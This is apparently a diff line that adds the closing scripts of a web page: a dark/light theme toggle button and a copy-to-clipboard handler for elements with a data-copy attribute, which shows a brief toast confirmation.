+<script>var r=document.documentElement,b=document.getElementById('tbtn');b&&b.addEventListener('click',function(){var c=r.getAttribute('data-theme')||(matchMedia('(prefers-color-scheme:dark)').matches?'dark':'light');r.setAttribute('data-theme',c==='dark'?'light':'dark')});</script><script>(function(){var t=document.createElement('div');t.className='toast';t.setAttribute('role','status');document.body.appendChild(t);var tm;function toast(m){t.textContent=m;t.classList.add('on');clearTimeout(tm);tm=setTimeout(function(){t.classList.remove('on')},1500);}document.addEventListener('click',function(e){var b=e.target.closest('[data-copy]');if(!b)return;var x=b.getAttribute('data-copy');navigator.clipboard.writeText(x).then(function(){toast('Copied to clipboard');if(b.classList.contains('copy')||b.classList.contains('copy2')){var o=b.textContent;b.textContent='copied';b.classList.add('ok');setTimeout(function(){b.textContent=o;b.classList.remove('ok')},1400);}},function(){toast('Copy failed');});});})();</script></body></html>
